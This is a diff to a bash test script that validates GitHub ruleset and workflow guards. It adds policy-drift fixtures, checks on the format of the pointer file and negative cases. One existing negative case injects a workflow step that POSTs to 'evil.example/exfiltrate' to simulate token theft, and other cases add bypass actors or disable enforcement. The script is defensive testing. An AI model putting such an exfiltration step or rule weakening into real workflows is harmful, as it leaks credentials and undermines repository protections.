@@ -311,6 +311,10 @@ validate_source_surface() {
   require_literal "${apply_script}" 'live ruleset ${name} contains forbidden A33 bypass; refusing to mutate' 'apply script must refuse forbidden live A33 bypasses before mutation'
   # shellcheck disable=SC2016
   require_literal "${apply_script}" 'ruleset ${name} is absent or duplicated after apply' 'apply script must fail if an expected live ruleset is absent'
+  # shellcheck disable=SC2016
+  require_literal "${apply_script}" 'desired_policy="$(desired_policy_defaults <"${rendered}" | canonical_policy)"' 'apply script must add payload defaults on the desired side only'
+  # shellcheck disable=SC2016
+  require_literal "${apply_script}" 'live_policy="$(gh api "repos/${repo}/rulesets/${live_id}" | canonical_policy)"' 'apply script must compare the live policy verbatim'
 
   validate_tag_workflow_shape
 
@@ -335,8 +339,17 @@ validate_source_surface() {
   grep -Fq '/git/refs/heads/' "${tag_helper}" && fail 'production tag helper must contain no branch-write endpoint'
   grep -Fq -- '--method DELETE' "${tag_helper}" && fail 'production tag helper must contain no delete path'
 
-  [ "$(sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' "${pointer}")" = 'target: 752170d700411ae4393e5dd92e9871708561932b' ] ||
-    fail 'initial machinery-stable pointer must be the verified authoritative fleet main SHA'
+  # Every promotion advances this pointer through the tag workflow, so routine
+  # validation pins its shape, not one bootstrap value: exactly the single
+  # non-comment line the tag helper itself accepts. The bootstrap observation
+  # stays recorded in docs/domain/fleet-guard.md, and the negative suite proves
+  # every malformed pointer is still refused.
+  local pointer_body
+  pointer_body="$(sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' "${pointer}")"
+  if [ "$(printf '%s\n' "${pointer_body}" | wc -l)" -ne 1 ] ||
+    [[ ! ${pointer_body} =~ ^target:[[:space:]][0-9a-f]{40}$ ]]; then
+    fail 'machinery-stable pointer must be exactly one line: target: <40-lowercase-hex-main-commit>'
+  fi
 
   grep -Eq '^[[:space:]]+pull_request:' "${e2e_workflow}" && fail 'sandbox e2e must not require secrets on pull_request'
   require_literal "${e2e_workflow}" 'AtomiCloud/fleet-guard-sandbox' 'periodic e2e must target the named non-production sandbox'
@@ -422,10 +435,78 @@ run_environment_contract() {
     "${dir}/environment.json" "${dir}/branch-policies.json" "${dir}/repository-secrets.json" 1002
 }
 
+# A rendered payload deliberately omits the two keys GitHub always materialises
+# for a pull_request rule; the live twin echoes those defaults back alongside
+# server-side bookkeeping the comparison must ignore.
+write_policy_drift_fixtures() {
+  local dir="$1"
+  mkdir -p "${dir}"
+  jq -n --argjson kargo "${kargo_actor_id}" '{
+    name: "registry-guard-main",
+    target: "branch",
+    enforcement: "active",
+    bypass_actors: [{actor_id: $kargo, actor_type: "Integration", bypass_mode: "always"}],
+    conditions: {ref_name: {include: ["~DEFAULT_BRANCH"], exclude: []}},
+    rules: [
+      {type: "deletion"},
+      {type: "non_fast_forward"},
+      {type: "pull_request", parameters: {
+        required_approving_review_count: 1,
+        require_code_owner_review: true,
+        dismiss_stale_reviews_on_push: true,
+        require_last_push_approval: true,
+        required_review_thread_resolution: false,
+        allowed_merge_methods: ["squash", "merge", "rebase"]
+      }}
+    ]
+  }' >"${dir}/desired.json"
+  jq '
+    .id = 4242
+    | .created_at = "2026-01-01T00:00:00Z"
+    | .source_type = "Repository"
+    | .rules |= sort_by(.type) | .rules |= reverse
+    | (.rules[] | select(.type == "pull_request") | .parameters) += {
+        dismissal_restriction: {allowed_actors: [], enabled: false},
+        required_reviewers: []
+      }
+  ' "${dir}/desired.json" >"${dir}/live.json"
+}
+
+run_policy_comparison_contract() {
+  bash "${apply_script}" --compare-policies "$1" "$2"
+}
+
+expect_policy_drift_rejected() {
+  local suite_dir="$1"
+  local valid_dir="$2"
+  local label="$3"
+  local filter="$4"
+  local case_dir
+  case_dir="${suite_dir}/policy-drift-$(printf '%s' "${label}" | tr ' /:' '---')"
+  mkdir -p "${case_dir}"
+  cp "${valid_dir}/desired.json" "${case_dir}/desired.json"
+  cp "${valid_dir}/live.json" "${case_dir}/live.json"
+  mutate_json "${case_dir}/live.json" "${filter}"
+  if run_policy_comparison_contract "${case_dir}/desired.json" "${case_dir}/live.json" >/dev/null 2>&1; then
+    fail "negative did not go red: ${label}"
+  fi
+  negative_cases_executed=$((negative_cases_executed + 1))
+}
+
 write_denial_fixture() {
   local dir="$1"
   mkdir -p "${dir}"
-  jq -n '{message: "Repository rule violations found"}' >"${dir}/policy.json"
+  # GitHub wraps a genuine ruleset denial in a generic "Validation Failed"
+  # envelope; the policy evidence lives in errors[].message.
+  jq -n '{
+    message: "Validation Failed",
+    errors: [{
+      resource: "Reference",
+      field: "ref",
+      code: "custom",
+      message: "Repository rule violations found"
+    }]
+  }' >"${dir}/policy.json"
 }
 
 run_policy_denial_contract() {
@@ -587,18 +668,60 @@ expect_workflow_source_rejected() {
   negative_cases_executed=$((negative_cases_executed + 1))
 }
 
+write_pointer_case() {
+  local valid_source="$1"
+  local case_dir="$2"
+  local content="$3"
+  cp -a "${valid_source}" "${case_dir}"
+  printf '%s\n' "${content}" >"${case_dir}/registry/machinery-stable.yaml"
+}
+
+expect_pointer_source_rejected() {
+  local suite_dir="$1"
+  local valid_source="$2"
+  local label="$3"
+  local content="$4"
+  local case_dir
+  case_dir="${suite_dir}/pointer-$(printf '%s' "${label}" | tr ' /:' '---')"
+  write_pointer_case "${valid_source}" "${case_dir}" "${content}"
+  if run_source_contract "${case_dir}" >/dev/null 2>&1; then
+    fail "negative did not go red: ${label}"
+  fi
+  negative_cases_executed=$((negative_cases_executed + 1))
+}
+
+# The counterpart to the refusals: a promoted pointer is an ordinary,
+# well-formed advance and must stay green in routine validation.
+expect_pointer_source_accepted() {
+  local suite_dir="$1"
+  local valid_source="$2"
+  local label="$3"
+  local content="$4"
+  local case_dir
+  case_dir="${suite_dir}/pointer-ok-$(printf '%s' "${label}" | tr ' /:' '---')"
+  write_pointer_case "${valid_source}" "${case_dir}" "${content}"
+  run_source_contract "${case_dir}" >/dev/null ||
+    fail "positive control went red: ${label}"
+}
+
 run_negative_suite() {
   local suite_dir="$1"
   local rendered_dir="$2"
   local metadata_dir="${suite_dir}/metadata-valid"
   local denial_dir="${suite_dir}/policy-denial-valid"
+  local drift_dir="${suite_dir}/policy-drift-valid"
   local source_dir="${suite_dir}/source-valid"
+  local pointer_sha='0123456789abcdef0123456789abcdef01234567'
+  local pointer_next_sha='89abcdef0123456789abcdef0123456789abcdef'
 
   negative_cases_executed=0
   validate_rendered_set "${rendered_dir}" "${codeowners}"
   write_metadata_fixtures "${metadata_dir}"
   run_metadata_contract "${metadata_dir}" >/dev/null || fail 'valid App metadata control fixture was rejected'
   run_environment_contract "${metadata_dir}" >/dev/null || fail 'valid protected-environment control fixture was rejected'
+  write_policy_drift_fixtures "${drift_dir}"
+  run_policy_comparison_contract "${drift_dir}/desired.json" "${drift_dir}/live.json" >/dev/null ||
+    fail 'live ruleset echoing only GitHub defaults must compare equal to the rendered payload'
   write_denial_fixture "${denial_dir}"
   run_policy_denial_contract 422 "${denial_dir}/policy.json" >/dev/null || fail 'valid policy-denial control fixture was rejected'
   copy_source_fixture "${source_dir}"
@@ -618,10 +741,20 @@ run_negative_suite() {
   expect_environment_rejected "${suite_dir}" "${metadata_dir}" 'protected environment reviewer drift' environment.json '(.protection_rules[] | select(.type == "required_reviewers") | .reviewers[0].reviewer.id) = 9999'
   expect_environment_rejected "${suite_dir}" "${metadata_dir}" 'repository-level A33 private key present' repository-secrets.json '. += [{name: "FLEET_MACHINERY_TAG_MOVER_PRIVATE_KEY"}]'
 
+  expect_policy_drift_rejected "${suite_dir}" "${drift_dir}" 'live dismissal restriction enabled' \
+    '(.rules[] | select(.type == "pull_request") | .parameters.dismissal_restriction) = {allowed_actors: [{actor_id: 9999, actor_type: "Team", bypass_mode: "always"}], enabled: true}'
+  expect_policy_drift_rejected "${suite_dir}" "${drift_dir}" 'live required reviewers added' \
+    '(.rules[] | select(.type == "pull_request") | .parameters.required_reviewers) = [{file_patterns: ["**"], minimum_approvals: 1, reviewer: {id: 9999, type: "Team"}}]'
+  expect_policy_drift_rejected "${suite_dir}" "${drift_dir}" 'live code owner review dropped' \
+    '(.rules[] | select(.type == "pull_request") | .parameters.require_code_owner_review) = false'
+  expect_policy_drift_rejected "${suite_dir}" "${drift_dir}" 'live bypass actor appended' \
+    '.bypass_actors += [{actor_id: 9999, actor_type: "Team", bypass_mode: "always"}]'
+  expect_policy_drift_rejected "${suite_dir}" "${drift_dir}" 'live enforcement disabled' '.enforcement = "disabled"'
+
   expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" '404 never proves policy denial' 404 '.'
   expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'missing scope never proves policy denial' 403 '.message = "Resource not accessible by integration"'
   expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'existing ref never proves policy denial' 422 '.message = "Reference already exists"'
-  expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'generic 422 never proves policy denial' 422 '.message = "Validation Failed"'
+  expect_policy_denial_rejected "${suite_dir}" "${denial_dir}" 'generic 422 never proves policy denial' 422 'del(.errors) | .message = "Validation Failed"'
 
   expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'code-owner review removed' registry-guard-main.json '(.rules[] | select(.type == "pull_request") | .parameters.require_code_owner_review) = false'
   expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'stale reviews retained' registry-guard-main.json '(.rules[] | select(.type == "pull_request") | .parameters.dismiss_stale_reviews_on_push) = false'
@@ -654,7 +787,24 @@ run_negative_suite() {
   expect_workflow_source_rejected "${suite_dir}" "${source_dir}" 'widened trigger path' '.on.push.paths += ["registry/**"]'
   expect_workflow_source_rejected "${suite_dir}" "${source_dir}" 'extra token-exfiltration step' '.jobs["move-forward"].steps += [{"name": "Exfiltrate A33 token", "shell": "bash", "run": "curl -fsS -X POST https://evil.example/exfiltrate"}]'
 
-  [ "${negative_cases_executed}" -gt 18 ] || fail "negative suite did not expand beyond 18 cases (found ${negative_cases_executed})"
+  # Deliberately synthetic SHAs: no bootstrap value belongs in routine validation.
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer names a branch' 'target: main'
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer abbreviated SHA' \
+    "target: ${pointer_sha:0:7}"
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer uppercase SHA' \
+    "target: $(printf '%s' "${pointer_sha}" | tr 'a-f' 'A-F')"
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer key renamed' "sha: ${pointer_sha}"
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer carries trailing content' \
+    "target: ${pointer_sha} extra"
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer carries a second target' \
+    "target: ${pointer_sha}
+target: ${pointer_next_sha}"
+  expect_pointer_source_rejected "${suite_dir}" "${source_dir}" 'pointer has no target' '# only a comment'
+  expect_pointer_source_accepted "${suite_dir}" "${source_dir}" 'promoted descendant pointer' \
+    "# Reviewed pointer consumed only by the protected machinery-stable workflow.
+target: ${pointer_next_sha}"
+
+  [ "${negative_cases_executed}" -gt 45 ] || fail "negative suite did not expand beyond 45 cases (found ${negative_cases_executed})"
   echo "  ${negative_cases_executed} controlled guard mutations rejected ✓"
 }
 
